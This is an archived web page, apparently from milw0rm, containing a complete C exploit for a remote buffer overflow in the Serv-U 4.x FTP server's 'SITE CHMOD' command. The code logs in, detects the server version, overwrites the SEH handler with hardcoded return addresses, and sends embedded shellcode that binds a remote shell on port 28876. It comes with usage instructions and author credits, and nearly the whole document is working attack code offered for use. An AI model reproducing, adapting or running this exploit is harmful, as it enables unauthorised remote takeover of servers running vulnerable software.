<html>
<head>
<title>Serv-U 4.x "site chmod" Remote Buffer Overflow Exploit</title>
<pre>
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;

#define exploit_length      511
#define NOP 'A'

#define SEH_handler_offset  400
char* SEH_handler     = &quot;\x41\x41\xEB\x04&quot;; // 3) jmp over next four bytes
char* retaddress_4004 = &quot;\xab\x1c\x5f\x01&quot;; // 1) libeay32.015f1cab
char* retaddress_4100 = &quot;\xcb\x1c\x41\x01&quot;; // 1) ssleay32.01411ccb
char* retaddress_4103 = &quot;\x8b\x1d\x41\x01&quot;; // 1) ssleay32.01411d8b

char* shellcode = 
  &quot;\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52&quot;
  &quot;\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1&quot;
  &quot;\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a&quot;
  &quot;\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01&quot;
  &quot;\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b&quot;
  &quot;\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32&quot;
  &quot;\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff&quot;
  &quot;\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe&quot;
  &quot;\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50&quot;
  &quot;\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff&quot;
  &quot;\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89&quot;
  &quot;\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff&quot;
  &quot;\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x6a&quot;
  &quot;\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x24\xff\xff\xff\x31\xdb&quot;
  &quot;\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x50\x50\x50\x53\x53\x31\xc0&quot;
  &quot;\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x6a\x44&quot;
  &quot;\x89\xe6\x50\x55\x53\x53\x53\x53\x54\x56\x53\x53\x53\x43\x53\x4b&quot;
  &quot;\x53\x53\x51\x53\x89\xfd\xbb\x21\xd0\x05\xd0\xe8\xe2\xfe\xff\xff&quot;
  &quot;\x31\xc0\x48\x8b\x44\x24\x04\xbb\x43\xcb\x8d\x5f\xe8\xd1\xfe\xff&quot;
  &quot;\xff\x5d\x5d\x5d\xbb\x12\x6b\x6d\xd0\xe8\xc4\xfe\xff\xff\x31\xc0&quot;
  &quot;\x50\x89\xfd\xbb\x69\x1d\x42\x3a\xe8\xb5\xfe\xff\xff&quot;;

int sock;
FILE* FILEsock;
int doubling;

void send_command(char *command, char *arguments) {
  int i;
  send(sock, command, strlen(command), 0);
  send(sock, &quot; &quot;, 1, 0);
  for (i=0; i&lt;strlen(arguments); i++) {
    send(sock, arguments+i, 1, 0);
    if (doubling &amp;&amp; arguments[i] == '\xff') send(sock, arguments+i, 1, 0);
  }
  send(sock, &quot;\x0a\x0d&quot;, 2, 0);
}

int main(int argc, char *argv[], char *envp[]) {
  struct sockaddr_in addr;
  char *outbuffer, inbuffer[256];
  char *retaddress = NULL;
  char *version = NULL;

  if (argc&lt;5) {
    printf(&quot;Usage: %s IP PORT USERNAME PASSWORD [DIRECTORY]\n&quot;, argv[0]);
    exit(-1);
  }

  printf(&quot;- Serv-ME ----------------------------------------------------\n&quot;
         &quot;  Serv-U v4.x \&quot;site chmod\&quot; exploit.\n&quot;
         &quot;  Written by SkyLined &lt;SkyLined@EduP.TUDelft.nl&gt;.\n&quot;
         &quot;  Credits for the vulnerability go to ICBM &lt;icbm@0x557.net&gt;.\n&quot;
         &quot;  Thanks to H D Moore for the shellcode (www.metasploit.com).\n&quot;
         &quot;  Greets to everyone at 0dd and #netric.\n&quot;
         &quot;  (K)(L)(F) for Suzan.\n&quot;
         &quot;\n&quot;
         &quot;  Binds a shell at %s:28876 if successfull.\n&quot;
         &quot;  Tested with: v4.0.0.4, v4.1.0.0, v4.1.0.3 on W2K-EN.\n&quot;
         &quot;--------------------------------------------------------------\n&quot;,
           argv[1]);

  addr.sin_family = AF_INET;
  addr.sin_port = htons(atoi(argv[2]));
  addr.sin_addr.s_addr = inet_addr(argv[1]);

  printf(&quot;\n[+] Connecting to %s:%s...\n&quot;, argv[1], argv[2]);
  if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
    perror(&quot;Socket creation failed&quot;);
    exit(-1);
  }
  if (connect(sock, (struct sockaddr *)&amp;addr, sizeof addr) == -1) {
    perror(&quot;Connection failed&quot;);
    exit(-1);
  }
  FILEsock = fdopen(sock, &quot;r&quot;);
  printf(&quot;    --&gt; %s&quot;, fgets(inbuffer, sizeof inbuffer, FILEsock));
  if (strstr(inbuffer, &quot;220 Serv-U FTP Server v4.&quot;) != inbuffer) {
    printf(&quot;[-] This is not a Serv-U v4.X ftp server.\n&quot;);
    exit(-1);
  }
  if (strstr(inbuffer, &quot;v4.1&quot;) &gt; 0) {
    retaddress = retaddress_4103;
    version = &quot;4.1.0.3&quot;;
  }

  printf(&quot;\n[+] Login in as %s:%s...\n&quot;, argv[3], argv[4]);
  send_command(&quot;USER&quot;, argv[3]);
  printf(&quot;    --&gt; %s&quot;, fgets(inbuffer, sizeof inbuffer, FILEsock));
  send_command(&quot;PASS&quot;, argv[4]);
  printf(&quot;    --&gt; %s&quot;, fgets(inbuffer, sizeof inbuffer, FILEsock));
  if (strstr(inbuffer, &quot;230&quot;) != inbuffer) {
    printf(&quot;[-] Login failed.\n&quot;);
    exit(-1);
  }

  if (argv[5]) {
    printf(&quot;\n[+] Changing directory...\n&quot;);
    send_command(&quot;CD&quot;, argv[5]);
    printf(&quot;    --&gt; %s&quot;, fgets(inbuffer, sizeof inbuffer, FILEsock));
  }

  outbuffer = (char*) malloc(exploit_length + strlen(shellcode));
  memset(outbuffer, NOP, exploit_length);
  memcpy(outbuffer+exploit_length, shellcode, strlen(shellcode));

  printf(&quot;\n[+] Checking if \\xff doubling is nescesary: &quot;);
  send_command(&quot;SITE CHMOD 477&quot;, &quot;-\xff\xff-&quot;);
  fgets(inbuffer, sizeof inbuffer, FILEsock);
  if (strchr(inbuffer, '\xff') == strrchr(inbuffer, '\xff')) {
    doubling = 1;
    printf(&quot;Yes.&quot;);
    retaddress = retaddress_4004;
    version = &quot;4.0.0.4&quot;;
  } else {
    printf(&quot;No.&quot;);
    if (retaddress==NULL) {
      retaddress = retaddress_4100;
      version = &quot;4.1.0.0&quot;;
    }
  }
  printf(&quot;\n[+] Serv-U FTP server version %s: using retaddress 0x%08x&quot;,
                      version, *(int*)retaddress);
  memcpy(outbuffer + SEH_handler_offset, SEH_handler, strlen(SEH_handler));
  memcpy(outbuffer + SEH_handler_offset + 4, retaddress, strlen(retaddress));

  printf(&quot;\n[+] Sending exploit... &quot;);
  send_command(&quot;SITE CHMOD 477&quot;, outbuffer);
  printf(&quot;send, you can now try to connect to %s:28876.\n&quot;, argv[1]);
  printf(&quot;    --&gt; %s&quot;, fgets(inbuffer, sizeof inbuffer, FILEsock));
  close(socket);
  printf(&quot;\n[+] Done. \n&quot;);
}


// milw0rm.com [2004-01-30]
</pre>
</html>

